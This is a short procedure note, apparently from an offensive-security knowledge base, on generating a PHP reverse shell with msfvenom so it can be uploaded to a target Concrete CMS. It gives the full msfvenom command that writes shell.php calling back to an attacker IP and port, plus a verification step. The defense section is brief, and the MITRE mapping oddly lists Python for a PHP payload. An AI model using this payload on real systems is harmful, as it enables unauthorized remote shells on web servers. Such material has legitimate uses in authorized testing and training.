---
tags:
  - payload-generation
  - reverse-shell
  - php
type: procedure
tools:
  - '[[tools/msfvenom]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/msfvenom-php-reverse-shell]]'
platforms:
  - Linux
techniques:
  - '[[Python]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1ac0f5e5-8074-4f4a-a7b3-786365da554f
created_at: '2025-12-14T17:24:08.471Z'
updated_at: '2025-12-14T17:24:08.471Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Generate-PHP-Reverse-Shell-Payload

## Summary

This procedure uses msfvenom to create a PHP reverse shell payload that connects back to the attacker's specified IP and port, preparing it for upload to the target CMS.

## Description

Msfvenom, part of the Metasploit Framework, generates platform-specific payloads. Here, it creates a PHP script that establishes a TCP connection to the attacker's listener upon execution, typically via a web request. This is key for RCE in web environments like Concrete CMS where PHP execution is possible post-upload.

## Requirements

1. Metasploit Framework installed on attacker's machine (includes msfvenom)
2. Knowledge of attacker's IP (LHOST) and chosen port (LPORT, e.g., 1234)
3. Local file system access to save the output

## Defense

Defensive measures and detection strategies:

- Scan for Metasploit artifacts or unusual payload generation on networks
- Implement web application firewalls (WAF) to block known reverse shell patterns in uploads
- Monitor for outbound connections from web servers to unexpected IPs/ports

## Objectives

1. Generate executable PHP code for reverse connection
2. Customize payload with attacker's network details
3. Produce a file ready for upload

## Instructions

### Step 1: Execute msfvenom Command

**Context**: Generate the payload using the php/reverse_php template.

**Command** ([[commands/msfvenom-php-reverse-shell]]):
```bash
msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=1234 > shell.php
```

> This command selects the PHP reverse payload, sets the host and port, and redirects output to shell.php. Expected output is the PHP code file without errors.

### Step 2: Verify Payload

**Context**: Ensure the generated file contains valid PHP code.

Inspect shell.php with a text editor or cat command.

> Look for PHP tags and socket connection code; no syntax errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]

### Sub-Techniques


## Commands Used

- [[commands/msfvenom-php-reverse-shell]]

## Tools Used

- [[tools/msfvenom]]

## Tags

- [[payload-generation]]
- [[reverse-shell]]
- [[php]]
